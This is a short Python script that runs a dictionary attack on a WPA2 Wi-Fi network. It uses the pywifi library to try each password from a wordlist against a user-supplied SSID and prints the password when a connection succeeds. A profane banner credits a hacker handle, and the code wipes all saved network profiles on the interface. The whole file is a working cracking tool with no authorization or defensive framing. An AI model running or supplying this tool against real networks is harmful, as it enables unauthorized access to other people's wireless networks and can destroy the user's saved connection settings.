import pywifi
from pywifi import const
import time
import os

def display_banner():
    os.system("clear")  
    
    os.system("echo 'FUCK WiFi' | figlet -c | lolcat")
    
    print("\033[5m\033[1;37m{:^80}\033[0m".format("Made by @carlosh4cker"))  

def connect(ssid, password):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]  
    iface.disconnect()  
    time.sleep(1)
    
    
    if iface.status() == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()  
        profile.ssid = ssid  
        profile.auth = const.AUTH_ALG_OPEN  
        profile.akm.append(const.AKM_TYPE_WPA2PSK)  
        profile.cipher = const.CIPHER_TYPE_CCMP  
        profile.key = password  
        
        iface.remove_all_network_profiles()  
        tmp_profile = iface.add_network_profile(profile)  
        
        iface.connect(tmp_profile)  
        time.sleep(5)  
        
        if iface.status() == const.IFACE_CONNECTED:
            print(f"[+] Password found: {password}")
            iface.disconnect()
            return True
        else:
            print(f"[-] Password incorrect: {password}")
            iface.disconnect()
            time.sleep(1)
    
    return False

def crack(ssid, wordlist):
    try:
        with open(wordlist, "r") as file:
            for line in file:
                password = line.strip()
                if connect(ssid, password):
                    break
    except FileNotFoundError:
        print("[-] Wordlist file not found. Please check the path and try again.")

if __name__ == "__main__":
    display_banner()  
    target_ssid = input("\nEnter the Wi-Fi network name (SSID): ")
    wordlist_path = input("Enter the full path to your wordlist file (e.g., /path/to/wordlist.txt): ")
    crack(target_ssid, wordlist_path)